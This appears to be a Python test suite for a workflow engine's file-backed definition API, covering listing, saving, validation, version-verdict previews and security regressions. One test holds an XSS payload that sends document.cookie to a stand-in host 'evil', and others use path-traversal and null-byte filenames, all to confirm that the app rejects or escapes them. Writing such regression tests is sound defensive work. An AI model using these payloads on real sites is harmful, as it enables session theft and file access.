"""文件事实源面：定义目录即事实源（列 / 读 / 写）+ 版本判定预演。

开发形态的核心断言是「文件是唯一事实源」：设计器保存写回 git 工作区里的
那份 JSON，而不是数据库里的第二份草稿；带病定义不落盘；版本号不写进文件。
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from flowork.api import load_definition
from flowork.contrib.web.app import create_app

EXAMPLES = Path(__file__).parent.parent / "examples"


@pytest.fixture()
def workdir(tmp_path: Path) -> Path:
    directory = tmp_path / "definitions"
    directory.mkdir()
    source = json.loads((EXAMPLES / "02_countersign_branch.json").read_text(encoding="utf-8"))
    (directory / "countersign.json").write_text(
        json.dumps({**source, "code": "countersign"}, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    return directory


@pytest.fixture()
def client(tmp_path: Path, workdir: Path) -> TestClient:
    app = create_app(db_file=tmp_path / "files.db", definitions_dir=workdir)
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture()
def db_client(tmp_path: Path) -> TestClient:
    """未配置目录：文件面不存在（托管/演示形态维持原样）。"""
    app = create_app(db_file=tmp_path / "db.db")
    with TestClient(app) as test_client:
        yield test_client


def _spec(client: TestClient, file_name: str = "countersign.json") -> dict:
    return client.get(f"/api/files/{file_name}").json()["spec"]


def _deploy(client: TestClient, spec: dict) -> None:
    engine = client.app.state.engine  # type: ignore[attr-defined]
    engine.repository.deploy(load_definition(spec, engine.config.node_registry))


def test_runtime_source_reported(client: TestClient, db_client: TestClient) -> None:
    """运行形态由后端下发——前端据它决定列表/保存走文件还是数据库。"""
    files = client.get("/api/runtime").json()
    assert files["source"] == "files"
    assert files["definitions_dir"].endswith("definitions")
    assert db_client.get("/api/runtime").json()["source"] == "db"


def test_file_surface_absent_without_dir(db_client: TestClient) -> None:
    """没配目录时三个文件端点根本不注册（不是 403/404 的半开面）。"""
    assert db_client.get("/api/files").status_code == 404


def test_list_files_reports_load_conclusions(client: TestClient, workdir: Path) -> None:
    (workdir / "broken.json").write_text("{ not json", encoding="utf-8")
    listing = client.get("/api/files").json()
    by_name = {item["file"]: item for item in listing["files"]}
    assert by_name["countersign.json"]["code"] == "countersign"
    assert by_name["countersign.json"]["valid"] is True
    # 坏文件不隐藏：如实报错，列表页可以点名
    assert by_name["broken.json"]["valid"] is False
    assert by_name["broken.json"]["error"]


def test_list_files_flags_duplicate_code(client: TestClient, workdir: Path) -> None:
    """同一 code 出现在两个文件里＝改哪个都不确定——两份都标需修复。"""
    data = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
    (workdir / "copy.json").write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
    by_name = {item["file"]: item for item in client.get("/api/files").json()["files"]}
    assert by_name["copy.json"]["valid"] is False
    assert by_name["countersign.json"]["valid"] is False
    assert "多个文件" in by_name["copy.json"]["error"]


def test_filename_need_not_equal_code(client: TestClient, workdir: Path) -> None:
    """文件名不强制等于 code：仓里既有 04_expense_claim.json 这类带序号的命名。"""
    data = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
    (workdir / "04_countersign_copy.json").write_text(
        json.dumps(data, ensure_ascii=False), encoding="utf-8"
    )
    (workdir / "countersign.json").unlink()  # 避免重复 code
    listing = client.get("/api/files").json()
    item = next(f for f in listing["files"] if f["file"] == "04_countersign_copy.json")
    assert item["valid"] is True
    assert item["code"] == "countersign"


def test_scenario_and_walkthrough_files_are_skipped(client: TestClient, workdir: Path) -> None:
    """目录里混着场景脚本/演练剧本：它们不是流程定义，不该列成「需要修复」。"""
    scenario = {"name": "某场景", "steps": [], "assertions": []}
    walkthrough = {"comment": "某剧本", "scenarios": []}
    (workdir / "x_scenario.json").write_text(
        json.dumps(scenario, ensure_ascii=False), encoding="utf-8"
    )
    (workdir / "x_walkthrough.json").write_text(
        json.dumps(walkthrough, ensure_ascii=False), encoding="utf-8"
    )
    names = {item["file"] for item in client.get("/api/files").json()["files"]}
    assert "countersign.json" in names
    assert "x_scenario.json" not in names
    assert "x_walkthrough.json" not in names


def test_genuinely_broken_definition_still_reported(client: TestClient, workdir: Path) -> None:
    """有 code 与 nodes 但结构非法＝真坏文件，仍然如实报错（别把跳过规则用宽了）。"""
    broken = {"code": "bad_flow", "nodes": [{"code": "n1", "kind": "nope"}], "flows": []}
    (workdir / "bad_flow.json").write_text(json.dumps(broken, ensure_ascii=False), encoding="utf-8")
    by_name = {item["file"]: item for item in client.get("/api/files").json()["files"]}
    assert by_name["bad_flow.json"]["valid"] is False
    assert by_name["bad_flow.json"]["error"]


def test_get_file_returns_spec(client: TestClient) -> None:
    payload = client.get("/api/files/countersign.json").json()
    assert payload["spec"]["code"] == "countersign"


def test_get_file_rejects_unknown_kind(client: TestClient, workdir: Path) -> None:
    data = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
    data["nodes"][1]["kind"] = "no_such_kind"
    (workdir / "weird.json").write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
    assert client.get("/api/files/weird.json").status_code == 422


def test_node_field_type_error_is_422_not_500(client: TestClient, workdir: Path) -> None:
    """节点字段类型错走 422：pydantic ValidationError 在 _resolve_node 抛出且不经
    load_definition 的包装路径——修前整条 500，客户端看不到「哪里写错了」。"""
    data = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
    for node in data["nodes"]:
        if node["kind"] == "user_task":
            node["deadlines"] = "notalist"
            break
    (workdir / "typed.json").write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
    response = client.get("/api/files/typed.json")
    assert response.status_code == 422
    # 归一后由 _resolve_node 直接给出节点级定位（2026-10-21 review 批 2：
    # ValidationError 包装下沉内核，三传输面同一消息形态）
    assert "节点结构不合法（kind=user_task）" in response.json()["detail"]


@pytest.mark.parametrize("name", ["../escape.json", "..", ".hidden.json", "a.txt"])
def test_path_traversal_rejected(client: TestClient, name: str) -> None:
    assert client.get(f"/api/files/{name}").status_code in (400, 404)


def test_save_file_writes_canonical_json(client: TestClient, workdir: Path) -> None:
    """保存：写回同一份文件、剥版本字段、保留 layout（画布工作不丢）。"""
    spec = _spec(client)
    spec["name"] = "改过的名字"
    spec["layout"] = {"start": {"x": 10, "y": 20}}
    response = client.put("/api/files/countersign.json", json=spec)
    assert response.status_code == 200, response.text
    written = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
    assert written["name"] == "改过的名字"
    assert written["layout"] == {"start": {"x": 10, "y": 20}}
    # 版本号由 deploy 判定，写进文件只会在 git diff 里制造噪音
    assert "major" not in written and "revision" not in written and "status" not in written
    # 旧 version 字段同样不写（load_definition 本就忽略它）
    assert "version" not in written


def test_save_file_refuses_invalid_definition(client: TestClient, workdir: Path) -> None:
    """校验不过不落盘——原文件内容保持不变。"""
    before = (workdir / "countersign.json").read_text(encoding="utf-8")
    spec = _spec(client)
    spec["nodes"] = [node for node in spec["nodes"] if node["kind"] != "start"]
    response = client.put("/api/files/countersign.json", json=spec)
    assert response.status_code == 422
    assert (workdir / "countersign.json").read_text(encoding="utf-8") == before


def test_save_file_rejects_code_change_in_place(client: TestClient, workdir: Path) -> None:
    """覆盖既有文件时不支持就地改 code（改名＝新增+删除，工具不做两件事）。"""
    before = (workdir / "countersign.json").read_text(encoding="utf-8")
    spec = _spec(client)
    spec["code"] = "other_code"
    response = client.put("/api/files/countersign.json", json=spec)
    assert response.status_code == 422
    assert "另存为新文件" in response.json()["detail"]
    assert (workdir / "countersign.json").read_text(encoding="utf-8") == before


def test_save_file_new_must_be_named_after_code(client: TestClient) -> None:
    spec = _spec(client)
    spec["code"] = "brand_new"
    response = client.put("/api/files/random_name.json", json=spec)
    assert response.status_code == 422
    assert "须命名为" in response.json()["detail"]


def test_save_file_rejects_duplicate_code(client: TestClient, workdir: Path) -> None:
    """同一 code 不能有两份文件——第二份直接拒写。"""
    spec = _spec(client)
    response = client.put("/api/files/countersign_copy.json", json=spec)
    assert response.status_code == 422
    assert "已存在于" in response.json()["detail"]
    assert not (workdir / "countersign_copy.json").exists()


def test_save_file_creates_new(client: TestClient, workdir: Path) -> None:
    spec = _spec(client)
    spec["code"] = "fresh_flow"
    spec["name"] = "新流程"
    response = client.put("/api/files/fresh_flow.json", json=spec)
    assert response.status_code == 200, response.text
    assert (workdir / "fresh_flow.json").is_file()


def test_saved_file_reloads_through_designer(client: TestClient) -> None:
    """往返一致：存盘再读回，画布拿到的是同一张图（规范化不改语义）。"""
    spec = _spec(client)
    spec["name"] = "往返检查"
    client.put("/api/files/countersign.json", json=spec)
    reloaded = _spec(client)
    assert reloaded["name"] == "往返检查"
    assert [n["code"] for n in reloaded["nodes"]] == [n["code"] for n in spec["nodes"]]
    assert reloaded["flows"] == spec["flows"]


def test_verdict_preview_does_not_write(client: TestClient) -> None:
    """版本判定预演：只判定不落库——预演后定义仍未发布。"""
    spec = _spec(client)
    response = client.post("/api/definitions/countersign/verdict", json=spec)
    assert response.status_code == 200, response.text
    payload = response.json()
    assert payload["next_major"] == 1
    assert payload["next_revision"] == 1
    assert payload["identical_to"] is None
    assert client.get("/api/definitions/countersign").status_code == 404


def test_verdict_preview_flags_breaking_contract(client: TestClient) -> None:
    """预演能报出破坏性变更：基线无契约、新版开始校验拒收 = R1。"""
    spec = json.loads((EXAMPLES / "01_simple_approval.json").read_text(encoding="utf-8"))
    _deploy(client, spec)
    tightened = {
        **spec,
        "input": {
            "type": "object",
            "properties": {"amount": {"type": "number"}},
            "required": ["amount"],
        },
    }
    payload = client.post("/api/definitions/simple_approval/verdict", json=tightened).json()
    assert payload["breaking"] is True
    assert payload["next_major"] == 2
    assert payload["triggered_rules"]


def test_export_published_source(client: TestClient) -> None:
    """导出源：source=published 只取已发布版（drift 对账的正确来源）。"""
    _deploy(client, _spec(client))
    payload = client.get("/api/definitions/countersign?source=published").json()
    assert payload["published_version"] == 1
    assert payload["draft_version"] is None
    assert payload["spec"]["code"] == "countersign"


def test_export_published_missing(client: TestClient) -> None:
    assert client.get("/api/definitions/countersign?source=published").status_code == 404


def test_null_byte_filename_is_400_not_500(client: TestClient, workdir: Path) -> None:
    """%00 文件名在守卫层拦下（2026-10-21 内核 review P2 回归）。

    修前 (root/name).resolve() 对 NUL 抛 ValueError → 500 而非 400。
    """
    response = client.get("/api/files/x%00bad.json")
    assert response.status_code == 400


def test_save_preserves_file_mode(client: TestClient, workdir: Path) -> None:
    """保存后文件权限不降级（2026-10-21 内核 review P2 回归）。

    修前 mkstemp 0600 直接 replace：0644 的定义文件存一次变仅属主可读。
    """
    data = json.loads((workdir / "countersign.json").read_text(encoding="utf-8"))
    target = workdir / "mode_check.json"
    data["code"] = "mode_check"
    target.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
    target.chmod(0o644)
    response = client.put("/api/files/mode_check.json", json=data)
    assert response.status_code == 200, response.text
    assert (target.stat().st_mode & 0o777) == 0o644


def test_demo_page_escapes_code_param() -> None:
    """示例页 code 参数经 JSON 转义注入（2026-10-21 内核 review P1-11 回归）。

    修前原样 f-string 拼进 <script> 字符串字面量——?code=x'});fetch(...);//
    即反射 XSS，且页面同源挂着文件写面。
    """
    import json as _json

    from flowork.contrib.web.app import _demo_page

    malicious = "x'});fetch('http://evil/'+document.cookie);//"
    page = _demo_page(malicious)
    assert _json.dumps(malicious) in page  # 转义后的字面量
    assert "definitionCode: 'x'" not in page  # 原样拼接形态不再出现
